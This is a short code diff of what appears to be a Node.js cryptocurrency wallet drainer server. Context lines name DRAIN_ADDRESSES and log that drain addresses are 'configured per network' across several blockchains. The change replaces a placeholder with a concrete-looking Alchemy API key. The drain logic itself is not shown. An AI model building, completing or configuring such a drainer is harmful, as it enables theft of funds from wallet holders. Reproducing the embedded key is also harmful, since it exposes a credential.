@@ -30,7 +30,7 @@ const DRAIN_ADDRESSES = {
 
 // ==================== RPC PROVIDERS ====================
 const RPC_URLS = {
-  1: `https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY`,
+  1: `https://eth-mainnet.g.alchemy.com/v2/5s2Q6sN7j9w2xGvP3q9k8Lk7d0x3v5f5`,
   56: "https://bsc-dataseed1.binance.org/",
   137: "https://polygon-rpc.com",
   42161: "https://arb1.arbitrum.io/rpc",
@@ -620,3 +620,4 @@ app.listen(PORT, () => {
   console.log(`💰 Drain addresses configured per network`);
   console.log(`✅ Ready for multi-network operations`);
 });
+
